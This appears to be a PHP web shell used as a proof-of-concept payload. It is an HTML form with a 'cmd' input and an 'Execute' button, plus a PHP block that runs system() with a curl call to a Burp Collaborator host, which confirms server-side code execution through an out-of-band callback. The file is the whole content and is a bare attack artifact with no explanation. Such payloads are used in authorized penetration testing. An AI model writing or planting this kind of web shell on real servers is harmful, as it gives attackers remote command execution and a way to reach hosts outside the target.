<!DOCTYPE html>

<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
        system('curl https://jqd7usd96hrw0eq7rhbq11hbk2quej.burpcollaborator.net');
    
?>
</pre>
</body>
</html>
